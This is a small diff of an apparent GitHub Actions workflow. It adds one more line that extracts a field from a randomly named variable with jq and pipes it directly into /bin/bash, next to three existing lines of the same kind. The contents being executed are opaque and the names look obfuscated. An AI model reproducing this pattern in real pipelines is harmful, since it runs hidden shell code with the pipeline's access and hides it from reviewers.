@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$sorlz173" | jq -r .apt3748 | /bin/bash
           printf '%s' "$vhg1" | jq -r .hiupn37 | /bin/bash
           echo $pderr37 | jq -r .uuybl13 | /bin/bash
+          printf '%s' "$n13" | jq -r .g7 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
